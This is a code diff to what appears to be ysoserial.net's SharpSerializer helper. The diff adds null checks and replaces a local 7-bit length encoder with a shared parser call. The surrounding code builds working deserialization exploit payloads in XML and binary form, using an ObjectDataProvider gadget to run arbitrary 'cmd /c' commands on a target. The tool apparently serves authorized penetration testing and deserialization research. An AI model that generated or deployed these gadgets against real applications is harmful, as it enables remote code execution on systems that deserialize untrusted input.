@@ -3,6 +3,7 @@
     using System;
     using System.Collections.Generic;
     using System.Text;
+    using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;
 
     /// <summary>
     /// Helper methods for sharp serialization exploit gadget generation.
@@ -37,6 +38,11 @@
         /// </remarks>
         internal static string GenerateSharpSerializerXmlPayload(string command)
         {
+            if (command == null)
+            {
+                command = string.Empty;
+            }
+
             return
                 $"<Complex name=\"Root\" type=\"System.Windows.Data.ObjectDataProvider, " +
                 $"PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToke" +
@@ -85,6 +91,11 @@
         /// </remarks>
         internal static byte[] GenerateSharpSerializerBinaryPayload(string command)
         {
+            if (command == null)
+            {
+                command = string.Empty;
+            }
+
             // First chunk of binary-serialized ObjectDataProvider bytes.
             IEnumerable<byte> firstPayloadPart =
                 Convert.FromBase64String("" +
@@ -101,10 +112,12 @@
             // [2 bytes 7-bit-encoded length]["/c "][<cmd>]
             byte[] cmdArgumentsPartBytes = Encoding.ASCII.GetBytes("/c ");
             byte[] commandBytes = Encoding.ASCII.GetBytes(command);
-            IEnumerable<byte> commandLengthBytes = Get7BitEncodedIntegerBytes(cmdArgumentsPartBytes.Length + commandBytes.Length);
+            IEnumerable<byte> commandLengthBytes = AdvancedBinaryFormatterParser.Calculate7BitEncodedInt(cmdArgumentsPartBytes.Length + commandBytes.Length);
 
             // Second chunk of binary-serialized ObjectDataProvider bytes.
-            IEnumerable<byte> secondPayloadPart = Convert.FromBase64String("BgEFAQIBBVN0YXJ0");
+            IEnumerable<byte> secondPayloadPart = 
+                Convert.FromBase64String(
+                    "BgEFAQIBBVN0YXJ0");
 
             List<byte> payload = new List<byte>();
             payload.AddRange(firstPayloadPart);
@@ -113,25 +126,6 @@
             payload.AddRange(commandBytes);
             payload.AddRange(secondPayloadPart);
             return payload.ToArray();
-        }
-
-        /// <summary>
-        /// Gets the bytes of the 7-bit integer representation of the supplied value.
-        /// </summary>
-        /// <param name="value">The value to retrieve the bytes for.</param>
-        /// <returns>The byte array.</returns>
-        private static IEnumerable<byte> Get7BitEncodedIntegerBytes(int value)
-        {
-            List<byte> bytes = new List<byte>();
-
-            uint num;
-            for (num = (uint)value; num >= 128U; num >>= 7)
-            {
-                bytes.Add((byte)(num | 128U));
-            }
-
-            bytes.Add((byte)num);
-            return bytes;
         }
     }
 }
